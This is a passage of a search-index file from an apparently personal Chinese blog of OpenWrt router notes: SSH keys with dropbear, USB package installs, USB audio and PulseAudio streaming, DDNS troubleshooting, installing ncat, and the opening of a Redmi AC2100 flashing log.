procd_close_instance\n}\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ssh-key\u767b\u5f55","title":"ssh key\u767b\u5f55","text":"<ul> <li>\u4e00\u822c\u53d1\u884c\u7248\u672c\u7684 Linux \u7cfb\u7edf\u90fd\u662f\u4f7f\u7528\u7684 <code>sshd</code> \u4f5c\u4e3a ssh \u670d\u52a1\u7aef\uff0c\u6211\u4eec\u5c06\u5ba2\u6237\u7aef\u7684 <code>~/.ssh/id_rsa.pub</code> \u62f7\u8d1d\u5230\u670d\u52a1\u7aef\u7684 <code>~/.ssh/authorized_keys</code> \u5373\u53ef</li> <li>openwrt \u4f7f\u7528\u7684 <code>dropbear</code> \u4f5c\u4e3a ssh \u7684\u670d\u52a1\u7aef\u7a0b\u5e8f\uff0c\u6211\u4eec\u9700\u8981\u5c06\u516c\u94a5\u62f7\u8d1d\u5230 <code>/etc/dropbear/authorized_keys</code>\uff0c\u6700\u597d\u4fdd\u8bc1\u5176\u6587\u4ef6\u6743\u9650\u662f 644</li> </ul> <p>\u6216\u8005\u4f7f\u7528luci\u754c\u9762System--&gt;Admin--&gt;SSH key\u6dfb\u52a0</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ssh-\u8fde\u63a5-server","title":"ssh \u8fde\u63a5 server","text":"<p>openwrt \u4f5c\u4e3a client \u8fde\u63a5\u5176\u5b83 server \u65f6\uff0c\u7531\u4e8e dropbear\uff0c\u4f1a\u53d1\u73b0\u5f88\u591a\u5730\u65b9\u90fd\u4e0d\u4e00\u6837</p> <ul> <li>dropbear \u6ca1\u6709\u770b\u5230\u54ea\u91cc\u5b58\u50a8\u4e86\u516c\u94a5</li> <li>\u5b89\u88c5 openkey-gen \u751f\u6210\u516c\u79c1\u94a5\u5bf9\u540e\uff0cssh \u4ecd\u7136\u4e0d\u8d77\u4f5c\u7528\u3002\u53d1\u73b0\u539f\u6765\u662f ssh \u9ed8\u8ba4\u53ea\u4f7f\u7528 .ssh/id_dropbear\u3002</li> </ul> <p>\u6b63\u786e\u505a\u6cd5\uff08dropbearkey \u4ee3\u66ff\u4e86 sshkey-gen\uff09</p> <pre><code># \u751f\u6210 \u79c1\u94a5\nmkdir .ssh\ndropbearkey -t ed25519 -f ~/.ssh/id_dropbear\n\n# \u67e5\u770b\u79c1\u94a5\u5bf9\u5e94\u516c\u94a5\ndropbearkey -y -f ~/.ssh/id_dropbear  # -y \u8868\u793a\u67e5\u770b\u79c1\u94a5\u5bf9\u5e94\u516c\u94a5\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u589e\u5927\u65e0\u7ebf\u7684\u53d1\u5c04\u529f\u7387","title":"\u589e\u5927\u65e0\u7ebf\u7684\u53d1\u5c04\u529f\u7387","text":"<p>\u4fee\u6539\u8def\u7531\u5668\u7684\u56fd\u5bb6\u5730\u533a\uff0c\u4f7f\u5f97\u65e0\u7ebf\u7684\u529f\u7387\u66f4\u5927\uff0c\u56e0\u6b64\u4fe1\u53f7\u66f4\u597d\u3002</p> <p>Network--&gt;Wireless\u4e2d\u9009\u62e9Edit 2.4Ghz\u548c5Ghz\u7f51\u7edc\uff0c\u5728Advanced Setting\u4e2d\u8bbe\u7f6eCountry Code\uff0c\u53ef\u4ee5\u4fee\u6539\u4e3aUS\u3002\u8fd9\u68372.4Ghz\u548c5Ghz\u4fe1\u53f7\u529f\u7387\u53d8\u4e3a30dBm\u548c26dBm</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u8f6f\u4ef6\u5b89\u88c5\u5728usb\u4e0a","title":"\u8f6f\u4ef6\u5b89\u88c5\u5728usb\u4e0a","text":"<p>\u6b63\u5e38\u60c5\u51b5\uff0c\u8def\u7531\u5668\u7684flash\u90fd\u5f88\u5c0f\uff0c\u6bd4\u598216MB\uff0c\u5f88\u96be\u88c5\u4e0b\u591a\u5c11\u8f6f\u4ef6\u3002\u4f46\u662f\u5982\u679c\u8def\u7531\u5668\u6709USB\u63a5\u53e3\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u63d2\u4e0aU\u76d8\u4f5c\u4e3a\u989d\u5916\u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u4ee5GB\u4e3a\u5355\u4f4d\u540e\uff0c\u5c31\u53ef\u4ee5\u968f\u610f\u5b89\u88c5\u8f6f\u4ef6\u4e86\u3002 \u8fc7\u7a0b\uff1a</p> <ol> <li> <p><code>/etc/opkg.conf</code>\u4e2d\u6dfb\u52a0usb dest</p> <pre><code>#/etc/opkg.conf\ndest root /\ndest usb /mnt/sdb1  #\u6dfb\u52a0\u6b64\u884c\uff0csdb1 \u4e3a\u6302\u8f7d\u7684 U \u76d8\u4f4d\u7f6e\ndest ram /tmp\nlists_dir ext /var/opkg-lists\noption overlay_root /overlay\noption check_signature\n</code></pre> </li> <li> <p>opkg \u5b89\u88c5\u8f6f\u4ef6\u65f6\uff0c\u6dfb\u52a0<code>-d usb</code>\u9009\u9879\uff0c\u5982\u5b89\u88c5 python</p> <pre><code>opkg install -d usb python3 python3-pip\n</code></pre> </li> <li> <p>\u4e0d\u77e5\u4e3a\u4f55\uff0c\u5b89\u88c5\u5728 usb \u4e0a\u65f6\uff0copkg \u521b\u5efa\u8f6f\u94fe\u63a5\u65f6\u4f1a\u62a5\u9519\uff0c\u5bfc\u81f4\u76f4\u63a5\u8fd0\u884c\u547d\u4ee4\u4f1a\u62a5\u9519\u3002\u56e0\u6b64\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u624b\u52a8\u521b\u5efa\u8f6f\u8fde\u63a5\uff0c\u5982 python \u9700\u8981\u521b\u5efa\u4ee5\u4e0b\u8f6f\u8fde\u63a5</p> <pre><code>ln -s /mnt/sdb1/usr/bin/python3.9 /usr/bin/python3\nln -s /mnt/sdb1/usr/lib/libpython3.9.so.1.0 /usr/lib/libpython3.9.so.1.0\n\nln -s /mnt/sdb1/usr/bin/pip3.9 /usr/bin/pip\nln -s /mnt/sdb1/usr/bin/pip3.9 /usr/bin/pip3\n</code></pre> </li> </ol>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u547d\u4ee4\u884c\u65e0\u6cd5\u663e\u793a\u4e2d\u6587","title":"\u547d\u4ee4\u884c\u65e0\u6cd5\u663e\u793a\u4e2d\u6587","text":"<p>\u9700\u8981\u5b89\u88c5<code>luci-i18n-base-zh-cn</code></p> <p>\u4f46\u662f tmux \u4ecd\u7136\u65e0\u6cd5\u663e\u793a\u4e2d\u6587</p> <pre><code>export LC_ALL=en_US.UTF-8\nexport LANG=en_US.UTF-8\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5176\u5b83_1","title":"\u5176\u5b83","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#webcam-\u8bbe\u5907","title":"webcam \u8bbe\u5907","text":"<pre><code>kmod-video-core kmod-video-uvc\n\nluci-app-mjpg-streamer  # mjpg-streamer\u7684\u6bcf\u4e2a\u7ec4\u4ef6\u9700\u8981\u5355\u72ec\u5b89\u88c5\nmjpg-streamer mjpg-streamer-input-uvc mjpg-streamer-output-http mjpg-streamer-www-simple\n</code></pre> <pre><code>root@p2w:~# opkg list-installed |grep usb\nkmod-usb-audio - 5.10.161-1\nkmod-usb-core - 5.10.161-1\nkmod-usb-dwc3 - 5.10.161-1\nkmod-usb-dwc3-qcom - 5.10.161-1\nkmod-usb-storage - 5.10.161-1\nkmod-usb-xhci-hcd - 5.10.161-1\nkmod-usb3 - 5.10.161-1\nroot@p2w:~# opkg list-installed |grep video\nkmod-video-core - 5.10.161-1\nkmod-video-uvc - 5.10.161-1\nkmod-video-videobuf2 - 5.10.161-1\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u97f3\u9891\u8bbe\u5907","title":"\u97f3\u9891\u8bbe\u5907","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9a71\u52a8","title":"\u9a71\u52a8","text":"<pre><code>opkg install kmod-usb-audio (kmod-sound-core)\n</code></pre> <p>\u6b64\u65f6\u5df2\u7ecf\u6709\u9a71\u52a8\u4e86\uff0c\u901a\u8fc7<code>/proc/asound</code>\u67e5\u770b\u8bbe\u5907</p> <pre><code>root@p2w:~# cat /proc/asound/cards\n 0 [Lanseyaoji     ]: USB-Audio - Lanseyaoji\nFEC Lanseyaoji at usb-xhci-hcd.0.auto-1, high speed\n</code></pre> <p>\u5b89\u88c5 alsa-utils\uff0c\u53ef\u4ee5\u4f7f\u7528 arecord, aplay \u5de5\u5177</p> <p>arecord, aplay - command-line sound recorder and player for ALSA soundcard driver</p> <pre><code>opkg install alsa-utils\n\nroot@p2w:~# opkg files alsa-utils\nPackage alsa-utils (1.2.6-1) is installed on root and has the following files:\n/usr/share/alsa/init/ca0106\n/usr/bin/amixer\n/usr/share/alsa/init/test\n/usr/share/alsa/init/info\n/usr/share/alsa/init/hda\n/usr/bin/alsamixer\n/usr/share/alsa/init/default\n/usr/bin/arecord\n/usr/share/alsa/init/00main\n/usr/share/alsa/init/help\n/usr/bin/aplay\n/usr/sbin/alsactl\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#alsa-utils","title":"alsa-utils","text":"<p><code>arecord -d 10 -f cd -t wav -D copy foobar.wav</code> will record foobar.wav as a 10-second, CD-quality wave file</p> <p><code>arecord -f cd -t wav --max-file-time 3600 --use-strftime %Y/%m/%d/listen-%H-%M-%v.wav</code> Record in stereo from the default audio source. Create a new file every hour. The files are placed in directories based on their start dates and have names which include their start times and file numbers.</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#pulseaudio","title":"pulseaudio","text":"<p>\u60f3\u8981\u8fbe\u5230\u7684\u6548\u679c\uff1a\u5728 windows \u4e0a\u5b9e\u65f6\u76d1\u542c\u8def\u7531\u5668 usb \u9ea6\u514b\u98ce\u7684\u97f3\u9891\u3002 \u5b9e\u73b0\u7684\u6548\u679c\uff1a\u5728 linux \u4e0a\u5b9e\u65f6\u76d1\u542c\u8def\u7531\u5668 usb \u9ea6\u514b\u98ce\u7684\u97f3\u9891\u3002</p> <ul> <li>\u5b89\u88c5 pulseaudio\uff1a[OpenWrt Wiki] PulseAudio</li> </ul> <pre><code>opkg install pulseaudio-tools pulseaudio-profiles\n\nroot@p2w \\u@\\h:\\w\\$ opkg list-installed |grep pulse                                                                                                                                                                                                                               19:04:09\npulseaudio-daemon-avahi - 14.2-8\npulseaudio-profiles - 14.2-8\npulseaudio-tools - 14.2-8\n</code></pre> <ul> <li>\u4fee\u6539 system.pa\uff08system \u6a21\u5f0f\u542f\u52a8\u4f7f\u7528\u8be5\u6587\u4ef6\uff0cper-user \u6a21\u5f0f\u542f\u52a8\u4f7f\u7528 default.pa\uff09</li> </ul> <pre><code>vim /etc/pulse/system.pa\n\n# \u5f00\u542ftcp\u8bbf\u95ee\uff0c\u6709\u51e0\u79cd\u4e0d\u540c\u7684\u8bbf\u95ee\u63a7\u5236\n\n#load-module module-native-protocol-tcp # server\u548cclient\u9700\u8981\u6709\u76f8\u540c\u7684cookie\uff0c\u4f4d\u4e8e`~/.config/pulse/cookie`\nload-module module-native-protocol-tcp auth-anonymous=1  # \u5141\u8bb8\u533f\u540d\n#load-module module-native-protocol-tcp auth-ip-acl=127.0.0.1;192.168.0.0/24 # \u901a\u8fc7ip\u8bbf\u95ee\u63a7\u5236\n</code></pre> <ul> <li>\u542f\u52a8 pulseaudio</li> </ul> <pre><code>service pulseaudio start  # \u4f1a\u4ee5system\u6a21\u5f0f\u542f\u52a8\uff08ps\u547d\u4ee4\u884c\u4e2d\u53ef\u4ee5\u770b\u5230--system\uff09, pactl\u65e0\u6cd5\u4f7f\u7528\n\nps |grep pulseaudio\n</code></pre> <ul> <li>\u5728 client \u4e0a\uff08\u6bd4\u5982 linux \u7b14\u8bb0\u672c\uff09\uff0c\u5b9e\u65f6\u64ad\u653e\u97f3\u9891</li> </ul> <pre><code>#load-module module-tunnel-sink server=192.168.36.230\nload-module module-tunnel-source server=192.168.36.230\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9047\u5230\u7684\u95ee\u9898_2","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7cfb\u7edf\u65f6\u95f4\u5bfc\u81f4-opkg-\u65e0\u6cd5\u4e0b\u8f7d","title":"\u7cfb\u7edf\u65f6\u95f4\u5bfc\u81f4 opkg \u65e0\u6cd5\u4e0b\u8f7d","text":"<p>\u901a\u8fc7 wget url\uff0c\u53d1\u73b0\u4ee5\u4e0b\u9519\u8bef</p> <pre><code>Connection error: Invalid SSL certificate\n</code></pre> <p>\u67e5\u627e SSL \u8bc1\u4e66\u9519\u8bef\u539f\u56e0\uff0c\u6709\u4e00\u9879\u662f\u7cfb\u7edf\u65f6\u95f4\u4e0d\u4e00\u81f4\u5bfc\u81f4\u7684\u3002 \u5728 openwrt System -&gt; System Localtime \u4e2d\uff0c\u53ef\u4ee5\u9009\u62e9 sync with browser\u3002\u540c\u6b65\u540e\u95ee\u9898\u89e3\u51b3\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ddns-curl-48-\u9519\u8bef","title":"ddns curl 48 \u9519\u8bef","text":"<p>\u5bfc\u81f4 ddns \u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c</p> <pre><code>Sat May  6 23:28:44 2023 user.warn ddns-scripts[12337]: FreeDNS: Transfer failed - retry 7/0 in 60 seconds\nSat May  6 23:29:41 2023 user.err ddns-scripts[11285]: FreeDNS_2_ipv6: cURL Error: '48'\n</code></pre> <p>\u9700\u8981\u66f4\u65b0 curl\uff1aUsing curl/libcurl4 for sending mails - Installing and Using OpenWrt - OpenWrt Forum</p> <p>Error code 48 in curl refers to \"<code>An unknown option was passed in to libcurl</code>\", which would be in line with OpenWrt's tendency to disable optional features for size reasons (apparently you can enable\u00a0<code>LIBCURL_SMTP</code>\u00a0when building from source).</p> <p>\u56fe\u5f62\u5316\u754c\u9762\u66f4\u65b0 curl \u548c libcurl</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ddns-\u65e0\u6cd5\u81ea\u52a8\u542f\u52a8","title":"ddns \u65e0\u6cd5\u81ea\u52a8\u542f\u52a8","text":"<p>\u770b\u5230 22.03 \u8fd8\u6709\u4eba\u9047\u5230\u4e00\u6837\u95ee\u9898\uff1a[OpenWrt Wiki] DDNS client \u624b\u52a8\u91cd\u542f ddns \u670d\u52a1\u53ef\u4ee5\uff0c\u4f46\u662f\u91cd\u542f\u8def\u7531\u5668\u540e\uff0cddns \u4ecd\u7136\u4e0d\u5728\u8fd0\u884c\u3002</p> <p>\u4fee\u6539\u4e86 procd \u987a\u5e8f\u4ecd\u7136\u4e0d\u884c\uff0c\u6682\u65f6\u901a\u8fc7 rc.local \u4e2d\u624b\u52a8\u91cd\u542f ddns \u89e3\u51b3</p> <pre><code>vim /etc/rc.local\n\nservice ddns restart\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#luci-proto-\u5b89\u88c5\u540e\u4e0d\u663e\u793a","title":"luci-proto \u5b89\u88c5\u540e\u4e0d\u663e\u793a","text":"<p>Luci-proto won't appear in LuCI after installation - Installing and Using OpenWrt - OpenWrt Forum</p> <pre><code>/etc/init.d/network restart\n</code></pre> <p>\u5982\u679c\u5b89\u88c5\u662f\u5b89\u88c5\u4e86 luci-app-xxx\uff0c\u60f3\u8981\u5728 luci \u4e2d\u663e\u793a\u3002</p> <ul> <li>\u65b9\u6cd5\u4e00\uff1a\u767b\u51fa\u7136\u540e\u767b\u5f55</li> <li>\u65b9\u6cd5\u4e8c\uff1a<code>/etc/init.d/rpcd restart</code></li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#git-remote-https-is-not-a-git-command","title":"git: 'remote-https' is not a git command","text":"<pre><code>opkg install git-http\n</code></pre> <p>git-http</p> <ul> <li>Git is a free &amp; open source, distributed version control system designed to handle everything from small to very large projects with speed and efficiency. This package allows git push/fetch over http(s) and ftp(s)</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#wan-\u53e3\u56e0\u4e3a\u9519\u8bef\u8bbe\u5907\u7684-ipv6-ra-\u800c\u65e0\u6cd5\u4e0a\u7f51","title":"wan \u53e3\u56e0\u4e3a\u9519\u8bef\u8bbe\u5907\u7684 ipv6 ra \u800c\u65e0\u6cd5\u4e0a\u7f51","text":"<p>\u5b66\u6821\u4fe1\u667a\u697c\u4e8c\u5c42\u6ca1\u6709\u505a vlan \u9694\u79bb\uff0c\u5bfc\u81f4\u6709\u65f6\u5176\u5b83\u8bbe\u5907\u9519\u8bef\u7684\u53d1\u9001 ra \u62a5\u6587\uff0c\u4fbf\u4f1a\u4f7f\u5f97\u6574\u4e2a\u7f51\u7edc\u7684\u8def\u7531\u5668 ipv6 \u8def\u7531\u51fa\u73b0\u95ee\u9898\u3002</p> <p>\u53d1\u73b0 openwrt \u6709\u4e00\u6761 MLD \u9632\u706b\u5899\u89c4\u5219\uff0c\u8be5\u89c4\u5219\u5141\u8bb8 wan \u53e3\u63a5\u6536 ra\uff0c\u5e76\u4e14\u6e90\u5730\u5740\u4e3a<code>fe80::/10</code>\u3002 \u56e0\u6b64\u53ea\u9700\u8981\u9650\u5236\u6e90\u5730\u5740\u4fbf\u53ef\u4ee5\u5c4f\u853d\u5176\u5b83\u8bbe\u5907\u7684 ra \u62a5\u6587\u4e86\u3002\u7f3a\u70b9\u662f\u5982\u679c\u4e4b\u540e\u8bbe\u5907\u79fb\u52a8\uff0c\u5219\u9700\u8981\u6dfb\u52a0\u5176\u5b83\u5730\u5740\u3002</p> <p></p> <p>\u601d\u8003\uff1a \u4e0d\u77e5\u9053\u4e3a\u4f55\u9ed8\u8ba4\u884c\u4e3a\u4e0d\u662f\uff0c\u5728\u63a5\u53d7\u65b0 ra \u65f6\u8ba9\u7528\u6237\u9009\u62e9\uff0c\u5426\u5219\u5148\u5ffd\u7565\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#nc-\u53c2\u6570\u53ea\u80fd\u8fde\u63a5\u65e0\u6cd5\u76d1\u542c","title":"nc \u53c2\u6570\u53ea\u80fd\u8fde\u63a5\u65e0\u6cd5\u76d1\u542c","text":"<p>\u539f\u672c\u7684 nc \u662f busybox \u63d0\u4f9b\u7684</p> <pre><code>opkg files /usr/bin/nc\n</code></pre> <p>\u5b89\u88c5 ncat \u5373\u53ef\u6709\u5b8c\u6574\u547d\u4ee4</p> <pre><code>opkg install ncat\n</code></pre> <p>ncat \u662f\u4e00\u4e2a multi-call binary</p> <ul> <li>nc \u4ecd\u7136\u662f\u65e7\u7684\u547d\u4ee4</li> <li>ncat \u624d\u662f\u5b8c\u6574\u547d\u4ee4</li> </ul> <p>\u8fd8\u6709\u4e00\u4e2a ncat-full\uff08install \u53ef\u4ee5\uff0csearch \u627e\u4e0d\u5230\uff09\uff0c\u611f\u89c9\u6ca1\u5565\u533a\u522b</p> <p>\u8fd8\u6709\u4e00\u4e2a netcat\uff0c\u6ca1\u6709 ncat \u597d\uff0c\u53c2\u6570\u5c11\u70b9</p> netcat 0.7.1-2 15.92 KiB Netcat\u00a0is a featured networking utility which reads and writes data across network connections, using the TCP/IP protocol.\u2026 ncat 7.93-3 69.04 KiB Much-improved reimplementation of\u00a0Netcat","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/","title":"\u8bb0\u5f55\u7ea2\u7c73 AC2100 \u6298\u817e","text":"<p>\u7b2c\u4e00\u6b21\u5c1d\u8bd5\u81ea\u5df1\u5237\u8def\u7531\u5668\uff0c\u7f51\u4e0a\u641c\u7d22\u4e86\u5f88\u591a\u8d44\u6599\uff0c\u5fd9\u6d3b\u4e86 2 \u5929\uff0c\u671f\u95f4\u5dee\u70b9\u4ee5\u4e3a\u5c06\u8def\u7531\u5668\u5237\u6210\u7816\u4e86\u3002</p> <p>\u7ea2\u7c73 AC2100 \u8fd9\u6b3e\u8def\u7531\u5668\u786e\u5b9e\u7b97\u662f\u5f88\u706b\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u8d44\u6599\u3002\u521a\u5f00\u59cb\u5728\u6069\u5c71\u8bba\u575b\u67e5\u627e\u5404\u79cd\u8d44\u6599\uff0c\u4f46\u662f\u89c9\u5f97\u6069\u5c71\u8bba\u575b\u7684\u5e16\u5b50\u6709\u70b9\u4e71\uff0c\u5bf9\u65b0\u624b\u4e0d\u592a\u53cb\u597d\u3002\u770b\u7cbe\u534e\u5e16\u65f6\u5e16\u5b50\u4e4b\u95f4\u7684\u8054\u7cfb\u6027\u4e0d\u5927\uff0c\u8981\u662f\u6709\u4e00\u4e2a\u677f\u5757\u8fdb\u884c\u603b\u7ed3\u6027\u7684\u4ecb\u7ecd\u5c31\u597d\u4e86\u3002</p> <p>\u6bd4\u5982\u4e0a\u6765\u5c31\u770b\u5230\u8bba\u575b\u8bf4\u4ec0\u4e48\u95ea\u5b58\u574f\u5757\u7684\uff0c\u5bfc\u81f4\u6211\u521a\u5f00\u59cb\u8fd8\u8981\u53bb\u7814\u7a76\u5982\u4f55\u67e5\u770b\u8def\u7531\u5668\u662f\u5426\u6709\u574f\u5757\u3002\u7136\u540e\u5c31\u662f\u770b\u5230\u7684\u90fd\u662f\u4ec0\u4e48 telnet \u7684\u65b9\u6848\uff0c\u4f46\u662f\u660e\u660e\u6709\u901a\u8fc7\u7f51\u9875\u5f00\u542f ssh \u7684\u975e\u5e38\u7b80\u5355\u7684\u65b9\u6848\u554a\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u5728\u8fc7\u65f6\u7684\u5e16\u5b50\u91cc\u63d0\u4e00\u4e0b\u5462\uff01\u8fd9\u70b9\u5bfc\u81f4\u6211\u5404\u79cd\u8d70\u5f2f\u8def\uff01\uff08\u8fd9\u70b9\u4e5f\u4f53\u73b0\u4e86\u603b\u7ed3\u6027\u5e16\u5b50\u7684\u91cd\u8981\uff09</p> <p>\u7136\u540e\u5c31\u662f\u4e3a\u4ec0\u4e48\u6069\u5c71\u91cc\u53ea\u63d0\u4f9b\u5404\u79cd openwrt \u7684\u6539\u7248\uff1f\u5c31\u6ca1\u6709\u4eba\u7ad9\u51fa\u6765\u8bf4\u4e00\u4e0b\u5b98\u65b9\u7248\u7684\u4f18\u7f3a\u70b9\u5417\uff1f\u8fd9\u4e00\u5ea6\u8ba9\u6211\u4ee5\u4e3a openwrt \u7684\u5b98\u65b9\u7248\u4e0d\u597d\u4e0d\u80fd\u7528\u5462\u3002\u4f46\u540e\u9762\u6211\u770b openwrt \u5b98\u7f51\u7684\u65f6\u5019\uff0c\u4e5f\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u7f3a\u70b9\u554a\uff0c\u800c\u4e14 openwrt \u5b98\u7f51\u6587\u6863\u975e\u5e38\u4e30\u5bcc\uff01\u662f\u5165\u95e8\u6298\u817e\u8def\u7531\u5668\u7684\u7edd\u4f73\u6750\u6599\u3002</p> <p>\u597d\u4e86\uff0c\u5410\u69fd\u5b8c\u6bd5\uff0c\u4ee5\u4e0b\u662f\u6211\u8fd9\u6bb5\u65f6\u95f4\u6298\u817e\u7684\u603b\u7ed3\u3002</p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u540d\u8bcd\u4ecb\u7ecd","title":"\u540d\u8bcd\u4ecb\u7ecd","text":"<ol> <li> <p>breed\uff1a\u4e00\u4e2a\u591a\u529f\u80fd\u7684\u5f15\u5bfc\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5237\u7cfb\u7edf\u56fa\u4ef6\uff0c\u9002\u914d\u4e86\u5f88\u591a\u786c\u4ef6\uff0c\u63d0\u4f9b\u4e86\u65b9\u4fbf\u7684 web \u754c\u9762\u548c\u547d\u4ee4\u884c\u754c\u9762\u3002</p> <p>\u539f\u5e16\uff1a\u30102020-10-09\u3011AR/QCA/MTK Breed\uff0c\u529f\u80fd\u5f3a\u5927\u7684\u591a\u7ebf\u7a0b Bootloader - OPENWRT \u4e13\u7248 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <p>\u4e0b\u8f7d\uff1aIndex of / (hackpascal.net)</p> </li> </ol>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u76f4\u63a5\u4e0a\u56fe","title":"\u76f4\u63a5\u4e0a\u56fe","text":"<p>\u8fd9\u5f20\u56fe\u663e\u793a\u4e86\u5404\u79cd\u5237\u673a\u7684\u65b9\u5f0f\uff0c\u5177\u4f53\u8fc7\u7a0b\u5728\u4e4b\u540e\u4ecb\u7ecd\u3002</p> <p></p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u83b7\u53d6-shell","title":"\u83b7\u53d6 